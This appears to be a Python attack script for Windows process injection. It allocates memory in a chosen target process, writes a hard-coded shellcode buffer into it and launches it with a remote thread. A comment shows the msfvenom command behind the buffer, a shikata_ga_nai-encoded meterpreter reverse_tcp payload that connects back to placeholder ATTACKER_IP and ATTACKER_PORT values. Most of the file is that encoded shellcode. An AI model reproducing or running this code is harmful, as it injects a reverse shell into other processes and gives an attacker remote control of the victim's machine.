from process_injector import ProcessInjector
from argparse import ArgumentParser

if __name__ == "__main__":
   parser = ArgumentParser() 
   parser.add_argument(
        "-p", "--pid",
        action="store_true",
        help="PROC will be a PID instead of a process name"
    )
   parser.add_argument("PROC", help="the target process")

   args = parser.parse_args()
   
   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python â€“e x86/shikata_ga_nai

   buf =  ""
   buf += "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
   buf += "\xef\xff\xff\xff\x48\xbb\xd8\x0d\xc5\x81\xf1\x16\x97"
   buf += "\xc4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
   buf += "\x24\x45\x46\x65\x01\xfe\x5b\xc4\xd8\x0d\x84\xd0\xb0"
   buf += "\x46\xc5\x8c\xe9\xdf\xa0\xc9\x7a\x44\xf7\x95\x8e\x45"
   buf += "\x4e\xd3\xe9\x5e\x1c\x96\xf8\x45\xca\x36\xbb\x5c\xdf"
   buf += "\x4f\xaa\x5d\x88\xb0\x38\x5e\xa6\x04\x74\x31\xa4\xfd"
   buf += "\xf3\x3a\xb7\x85\x19\xc4\xc8\xc0\xf0\xd7\x75\x29\x8a"
   buf += "\x45\x4e\xd3\xd1\x57\xc6\x4f\x9a\x31\x8d\x80\x21\x70"
   buf += "\x16\xbc\xc0\x06\xc7\x8e\x74\x64\x97\xc4\xd8\x86\x45"
   buf += "\x09\xf1\x16\x97\x8c\x5d\xcd\xb1\xe6\xb9\x17\x47\x94"
   buf += "\x53\x45\xdd\xc5\x7a\x56\xb7\x8d\xd9\xdd\x26\xd7\xb9"
   buf += "\xe9\x5e\x89\xe9\xc4\x84\x0a\xc5\x9e\xdf\xc5\x0e\x45"
   buf += "\xf4\x41\x5d\x57\x56\x0d\xd5\x4c\xc4\x40\xc9\xf6\xe2"
   buf += "\x35\x94\x0e\x89\xa5\xf9\x53\xae\x15\xad\xd5\x9d\xc5"
   buf += "\x7a\x56\xb3\x8d\xd9\xdd\xa3\xc0\x7a\x1a\xdf\x80\x53"
   buf += "\x4d\xd9\xc8\xf0\xc6\xd6\x4f\xdc\x85\x8d\x80\x21\x57"
   buf += "\xcf\x85\x80\x53\x9c\xdb\xb0\x4e\xd6\x9d\x99\x57\x8d"
   buf += "\x02\x1d\x36\xd6\x96\x27\xed\x9d\xc0\xa8\x4c\xdf\x4f"
   buf += "\xca\xe4\x8e\x7e\x0e\xe9\xca\x8d\x66\x7a\xb6\xb3\xae"
   buf += "\x25\xa5\xc4\xd8\x4c\x93\xc8\x78\xf0\xdf\x45\x34\xad"
   buf += "\xc4\x81\xf1\x5f\x1e\x21\x91\xb1\xc7\x81\xf1\x46\x57"
   buf += "\x6c\xf9\x8d\x84\xd5\xb8\x9f\x73\x88\x51\xfc\x84\x3b"
   buf += "\xbd\x61\xb1\xc3\x27\xd8\x89\x08\x1b\x7e\x96\xc5\xd8"
   buf += "\x0d\x9c\xc0\x4b\x3f\x17\xaf\xd8\xf2\x10\xeb\xfb\x57"
   buf += "\xc9\x94\x88\x40\xf4\x48\xbc\x27\x57\x8c\x27\xcd\x8d"
   buf += "\x08\x33\x5e\x68\x04\x90\x84\x04\xc0\x4b\xfc\x98\x1b"
   buf += "\x38\xf2\x10\xc9\x78\xd1\xfd\xd4\x99\x55\x89\x08\x13"
   buf += "\x5e\x1e\x3d\x99\xb7\x5c\x24\x85\x77\x68\x11\x5d\xcd"
   buf += "\xb1\x8b\xb8\xe9\x59\xb1\x3d\xe5\x56\x81\xf1\x16\xdf"
   buf += "\x47\x34\x1d\x8d\x08\x13\x5b\xa6\x0d\xb2\x09\x84\xd9"
   buf += "\xb9\x9f\x6e\x85\x62\x0f\x1c\x49\xae\xe9\x42\x47\x20"
   buf += "\x0d\xbb\xd4\xb9\x95\x53\xe4\x86\x84\x33\xeb\xb1\x57"
   buf += "\xce\xac\xd8\x1d\xc5\x81\xb0\x4e\xdf\x4d\x2a\x45\xf4"
   buf += "\x48\xb0\xac\xcf\x60\x8b\xe8\x3a\x54\xb9\x9f\x54\x8d"
   buf += "\x51\xca\x88\xb0\x38\x5f\x1e\x34\x90\x84\x1f\xc9\x78"
   buf += "\xef\xd6\x7e\xda\xd4\x0d\xde\x0e\xc3\x14\x3c\xd8\x70"
   buf += "\xed\xd9\xb0\x41\xce\xac\xd8\x4d\xc5\x81\xb0\x4e\xfd"
   buf += "\xc4\x82\x4c\x7f\x8a\xde\x19\xa7\x3b\x0d\x5a\x9c\xc0"
   buf += "\x4b\x63\xf9\x89\xb9\xf2\x10\xc8\x0e\xd8\x7e\xf8\x27"
   buf += "\xf2\x3a\xc9\xf0\xd5\xdf\xed\x1e\x45\x40\x77\x84\xa2"
   buf += "\xd6\x3b\x3f\x55\xaf\x81\xa8\xad\x77\xd9\xf2\x07\x84"
   buf += "\x08\x2b\xe9\x42\xc4"
   
   with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
       # Allocating memory in target process with VirtualAllocEx
       base_addr = ps_handle.virtual_alloc_ex(len(buf))
       print(f"Base Address @ {base_addr}")
       print("[+] Writing data into allocated memory...")
       ps_handle.write_process_memory(buf, len(buf))
       print("[+] Creating remote thread...")
       ps_handle.create_remote_thread()
       print("[+] Remote process memory injection Successful ...")
